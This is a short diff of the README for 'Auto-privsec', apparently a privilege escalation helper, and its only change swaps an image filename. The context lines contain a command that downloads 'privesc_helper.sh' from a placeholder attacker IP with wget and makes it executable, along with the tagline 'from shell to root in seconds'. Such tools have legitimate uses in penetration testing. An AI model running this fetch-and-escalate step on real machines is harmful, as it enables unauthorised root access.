@@ -14,7 +14,7 @@ wget http://<attacker-ip>/privesc_helper.sh
 chmod +x privesc_helper.sh
 ```
 <p align="center">
-  <img src="picrepo.jpg" alt="Auto-privsec Demo Screenshot" width="800px">
+  <img src="demo.jpg" alt="Auto-privsec Demo Screenshot" width="800px">
 </p>
 
 <p align="center"><b>From shell to root in seconds — your privilege escalation sidekick</b></p>
